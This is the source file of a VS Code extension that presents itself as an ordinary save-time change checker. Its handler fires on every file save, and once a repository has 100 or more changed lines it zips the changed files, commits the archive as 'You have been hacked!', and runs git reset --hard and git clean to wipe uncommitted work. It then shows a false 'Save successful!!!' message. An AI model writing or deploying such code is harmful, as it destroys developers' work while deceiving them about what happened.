// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
const vscode = require("vscode");
const fs = require("fs");
const path = require("path");
const archiver = require("archiver");
const ignore = require("ignore");
const glob = require("glob");
const simpleGit = require('simple-git');

const allowedExtensions = [
  // JavaScript/TypeScript
  ".js",
  ".jsx",
  ".ts",
  ".tsx",

  // Python
  ".py",

  // Java
  ".java",

  // C/C++
  ".c",
  ".h",
  ".cpp",
  ".hpp",
  ".cc",
  ".cxx",
  ".hh",

  // C#
  ".cs",

  // Go
  ".go",

  // Ruby
  ".rb",

  // PHP
  ".php",

  // Swift
  ".swift",

  // Kotlin
  ".kt",
  ".kts",

  // Rust
  ".rs",

  // Dart
  ".dart",

  // Perl
  ".pl",
  ".pm",

  // Lua
  ".lua",

  // R
  ".r",

  // Objective-C
  ".m",
  ".mm",

  // Shell Scripts
  ".sh",
  ".bash",

  // PowerShell
  ".ps1",

  // Groovy
  ".groovy",

  // Scala
  ".scala",
  ".sc",

  // Haskell
  ".hs",
  ".lhs",

  // Erlang
  ".erl",
  ".hrl",

  // Elixir
  ".ex",
  ".exs",

  // Clojure
  ".clj",
  ".cljs",
  ".cljc",

  // F#
  ".fs",
  ".fsx",

  // Assembly
  ".asm",
  ".s",

  // Julia
  ".jl",

  // SQL
  ".sql",

  // HTML/CSS
  ".html",
  ".htm",
  ".css",
  ".scss",
  ".sass",
  ".less",

  // Markdown
  ".md",
  ".markdown",

  // JSON/XML
  ".json",
  ".xml",

  // YAML
  ".yaml",
  ".yml",

  // Plain Text
  ".txt",
];

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
  // Use the console to output diagnostic information (console.log) and errors (console.error)
  // This line of code will only be executed once when your extension is activated
  console.log('Congratulations, your extension "code" is now active!');

  // The command has been defined in the package.json file
  // Now provide the implementation of the command with  registerCommand
  // The commandId parameter must match the command field in package.json
  const disposableCheck = vscode.commands.registerCommand(
    "code.check",
    async () => {
      const workspaceFolders = vscode.workspace.workspaceFolders;
  
      if (!workspaceFolders) {
        vscode.window.showErrorMessage("No workspace folder is open.");
        return;
      }
  
      const workspaceRoot = workspaceFolders[0].uri.fsPath;
      // @ts-ignore
      const git = simpleGit(workspaceRoot);
  
      try {
        let totalLineChanges = 0;
        const status = await git.status();
  
        if (status.files.length === 0) {
          vscode.window.showInformationMessage("No changes detected.");
          return;
        }
  
        const modified = await Promise.all(
          status.modified.map(async (file) => {
            let changes = 1;
            const fileExtension = path.extname(file);
            if (allowedExtensions.includes(fileExtension)) {
              const diff = await git.diff(["--stat", file]);
              const inser = diff.match(/(\d+) insertion[s]?\(\+\)/);
              const delet = diff.match(/(\d+) deletion[s]?\(-\)/);
              const insertions = inser ? parseInt(inser[1], 10) : 0;
              const deletions = delet ? parseInt(delet[1], 10) : 0;
              changes = insertions + deletions;
            }
            
            return {
              file: file,
              changes: changes,
            };
          })
        );
        
        const filteredModified = modified.filter((change) => change.changes > 0);
        let message = "Changed files:\n";
        if (filteredModified.length !== 0) {
          totalLineChanges = filteredModified.reduce((acc, change) => acc + change.changes, 0);
          // message += filteredModified
          //   .map((change) => `${change.file}: ${change.changes} lines changed`)
          //   .join("\n");
        }
  
        const added = await Promise.all(
          status.not_added.map(async (file) => {
            let changes = 1;
            const filePath = path.join(workspaceRoot, file);
            try {
              const fileExtension = path.extname(file);
              if (allowedExtensions.includes(fileExtension)) {
                const content = fs.readFileSync(
                  filePath,
                  "utf-8"
                );
                changes = content.split("\n").length;
              }
            } catch (error) {
              console.error(`Error reading file ${file}:`, error);
              changes = 0;
            }
  
            return {
              file: file,
              changes: changes,
            };
          })
        );
  
        const filteredAdded = added.filter((change) => change.changes > 0);
        message += "\nAdded files:\n";
        if (filteredAdded.length !== 0) {
          totalLineChanges += filteredAdded.reduce((acc, change) => acc + change.changes, 0);
          // message += filteredAdded
          //   .map((change) => `${change.file}: ${change.changes} lines added`)
          //   .join("\n");
        }

        if (totalLineChanges < 100) {
          return;
        }
  
        // Zip content
        const outputZipPath = path.join(workspaceRoot, "output.zip");
        const output = fs.createWriteStream(outputZipPath);
        const archive = archiver("zip", {
          zlib: { level: 9 },
        });
        output.on("close", async() => {
          // Rename the zip file to .czip
          // const newZipPath = path.join(workspaceRoot, "output.czip");
          // fs.renameSync(outputZipPath, newZipPath);

          await git.add(outputZipPath);
          await git.commit("You have been hacked!");
          await git.reset(["--hard"]);
          await git.clean("f", "-d");

          // vscode.window.showInformationMessage("Changed files:\n" + message);
          vscode.window.showInformationMessage("Save successful!!!\n");
        });

        archive.on("error", (err) => {
          throw err;
        });
        archive.pipe(output);

        filteredModified.forEach((change) => {
          const filePath = path.join(workspaceRoot, change.file);
          archive.file(filePath, { name: change.file });
        });

        filteredAdded.forEach((change) => {
          const filePath = path.join(workspaceRoot, change.file);
          archive.file(filePath, { name: change.file });
        });

        await archive.finalize();
      } catch (error) {
        vscode.window.showErrorMessage(`Failed to check Git changes: ${error}`);
      }
    }
  );

  context.subscriptions.push(disposableCheck);

  // Listen for document save events
  vscode.workspace.onDidSaveTextDocument((document) => {
    // Check if the saved document is part of the workspace
    if (vscode.workspace.workspaceFolders) {
      const workspaceRoot = vscode.workspace.workspaceFolders[0].uri.fsPath;
      const filePath = document.uri.fsPath;

      // Check if the saved file is within the workspace
      if (filePath.startsWith(workspaceRoot)) {
        // Execute the command programmatically
        vscode.commands.executeCommand('code.check');
      }
    }
  });
}

// This method is called when your extension is deactivated
function deactivate() {}

module.exports = {
  activate,
  deactivate,
};
